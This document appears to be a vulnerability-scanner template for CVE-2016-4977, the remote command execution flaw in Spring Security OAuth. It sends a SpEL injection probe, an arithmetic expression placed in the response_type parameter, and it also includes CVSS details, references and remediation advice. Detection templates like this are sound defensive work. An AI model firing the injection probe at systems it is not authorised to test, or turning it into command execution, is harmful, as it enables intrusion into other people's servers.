http:
- matchers:
  - part: body
    type: word
    words:
    - 'Unsupported response types: [978015547]'
  - status:
    - 400
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test'
id: CVE-2016-4977
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:pivotal:spring_security_oauth:1.0.0:*:*:*:*:*:*:*
    cve-id: CVE-2016-4977
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-19
    epss-percentile: 0.99899
    epss-score: 0.94093
  description: Spring Security OAuth versions 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5 contain
    a remote command execution vulnerability. When processing authorization requests
    using the whitelabel views, the response_type parameter value was executed as
    Spring SpEL which enabled a malicious user to trigger remote command execution
    via the crafting of the value for response_type.
  impact: 'Successful exploitation of this vulnerability can lead to remote code execution,
    compromising the affected system.

    '
  metadata:
    max-request: 1
    product: spring_security_oauth
    vendor: pivotal
  name: Spring Security OAuth2 Remote Command Execution
  reference:
  - https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/README.md
  - https://tanzu.vmware.com/security/cve-2016-4977
  - https://nvd.nist.gov/vuln/detail/CVE-2016-4977
  - https://pivotal.io/security/cve-2016-4977
  - http://www.openwall.com/lists/oss-security/2019/10/16/1
  remediation: Users of 1.0.x should not use whitelabel views for approval and error
    pages. Users of 2.0.x should either not use whitelabel views for approval and
    error pages or upgrade to 2.0.10 or later.
  severity: high
  tags: cve2016,cve,oauth2,oauth,rce,ssti,vulhub,spring,pivotal,vkev,vuln
